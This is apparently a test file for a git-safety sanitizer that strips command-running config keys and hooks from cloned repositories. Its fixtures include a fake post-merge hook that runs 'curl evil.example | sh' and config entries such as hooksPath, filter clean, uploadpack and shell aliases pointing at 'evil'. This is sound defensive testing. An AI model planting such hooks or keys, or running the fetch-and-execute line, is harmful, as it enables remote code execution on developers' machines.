import { afterAll, describe, expect, test } from 'bun:test';
import { mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { sanitizeGitRepos } from './git-safety';

const runner = {
  run: ({ command }: { command: string }) => {
    const result = Bun.spawnSync(['bash', '-c', command]);
    return Promise.resolve({
      exitCode: result.exitCode ?? 1,
      stderr: result.stderr.toString(),
      stdout: result.stdout.toString(),
    });
  },
};

const root = mkdtempSync(join(tmpdir(), 'kyto-git-safety-'));
afterAll(() => rmSync(root, { force: true, recursive: true }));

function listConfig(path: string): string {
  return Bun.spawnSync([
    'git',
    'config',
    '--file',
    path,
    '--list',
  ]).stdout.toString();
}

describe('sanitizeGitRepos', () => {
  test('strips command-running keys in every syntax git accepts', async () => {
    const repo = join(root, 'repo');
    Bun.spawnSync(['git', 'init', '-q', repo]);
    const config = join(repo, '.git', 'config');
    // `[core] key = value` on one line and the dotted `[filter.x]` header are
    // both valid git syntax that a line-by-line reader missed.
    writeFileSync(
      config,
      [
        '[core]',
        '\trepositoryformatversion = 0',
        '[core] hooksPath = /tmp/evil',
        '[filter.lfs2]',
        '\tclean = evil',
        '[remote "origin"]',
        '\turl = https://example.com/x',
        '\tuploadpack = evil',
        '[include]',
        '\tpath = /tmp/other',
        '[alias]',
        '\tst = !evil',
        '[user]',
        '\tname = ok',
        '',
      ].join('\n')
    );
    writeFileSync(join(repo, '.git', 'hooks', 'fsmonitor'), '#!/bin/sh\n');
    const result = await sanitizeGitRepos({
      dirs: [root],
      runner,
      since: Date.now() / 1000 - 60,
    });
    // git init's inert *.sample templates are removed but not reported.
    expect(result?.flagged).toEqual([
      {
        hookNames: ['fsmonitor'],
        keys: [
          'alias.st',
          'core.hookspath',
          'filter.lfs2.clean',
          'include.path',
          'remote.origin.uploadpack',
        ],
        repo,
      },
    ]);
    expect(result?.keys).toEqual([
      'alias.st',
      'core.hookspath',
      'filter.lfs2.clean',
      'include.path',
      'remote.origin.uploadpack',
    ]);
    const left = listConfig(config);
    expect(left).toContain('remote.origin.url=https://example.com/x');
    expect(left).toContain('user.name=ok');
    expect(left).not.toContain('evil');
  });

  test('a husky hooksPath, or a repo that predates the fetch, is disarmed but not reported', async () => {
    const husky = join(root, 'husky');
    Bun.spawnSync(['git', 'init', '-q', husky]);
    Bun.spawnSync([
      'git',
      'config',
      '--file',
      join(husky, '.git', 'config'),
      'core.hooksPath',
      '.husky/_',
    ]);
    const fresh = await sanitizeGitRepos({
      dirs: [husky],
      runner,
      since: Date.now() / 1000 - 60,
    });
    expect(fresh?.keys).toEqual(['core.hookspath']);
    expect(fresh?.flagged).toEqual([]);

    const old = join(root, 'old');
    Bun.spawnSync(['git', 'init', '-q', old]);
    Bun.spawnSync([
      'git',
      'config',
      '--file',
      join(old, '.git', 'config'),
      'core.fsmonitor',
      'evil',
    ]);
    const later = await sanitizeGitRepos({
      dirs: [old],
      runner,
      since: Date.now() / 1000 + 60,
    });
    expect(later?.keys).toEqual(['core.fsmonitor']);
    expect(later?.flagged).toEqual([]);
  });

  test('hooks written by common installers are removed but not reported', async () => {
    const repo = join(root, 'installers');
    Bun.spawnSync(['git', 'init', '-q', repo]);
    const hooks = join(repo, '.git', 'hooks');
    writeFileSync(
      join(hooks, 'pre-commit'),
      '#!/bin/sh\n# SKIP_SIMPLE_GIT_HOOKS\nnpx lint-staged\n'
    );
    writeFileSync(
      join(hooks, 'pre-push'),
      '#!/bin/sh\ncommand -v git-lfs\ngit lfs pre-push "$@"\n'
    );
    writeFileSync(
      join(hooks, 'post-merge'),
      '#!/bin/sh\ncurl evil.example | sh\n'
    );
    const result = await sanitizeGitRepos({
      dirs: [repo],
      runner,
      since: Date.now() / 1000 - 60,
    });
    expect(result?.flagged.map((f) => f.hookNames)).toEqual([['post-merge']]);
  });
});
